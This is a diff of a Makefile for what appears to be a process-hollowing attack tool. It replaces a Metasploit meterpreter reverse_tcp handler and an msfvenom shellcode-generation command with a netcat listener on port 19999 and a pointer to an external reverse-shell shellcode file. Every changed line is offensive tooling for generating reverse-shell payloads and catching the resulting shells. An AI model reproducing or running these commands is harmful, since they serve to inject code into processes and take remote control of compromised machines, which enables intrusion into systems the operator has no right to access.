@@ -7,10 +7,10 @@ example:
 	gcc -o example example.c -Os -lm	
 
 listen-example:
-	sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 443; exploit"
+	nc -lvnp 19999
 
 shellcode:
-	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f c
+	echo "shellcode is avaliable in https://github.com/Yyax13/shellcode in src/shellcodes/reverse.asm"
 
 clean:
 	rm -f hollowing
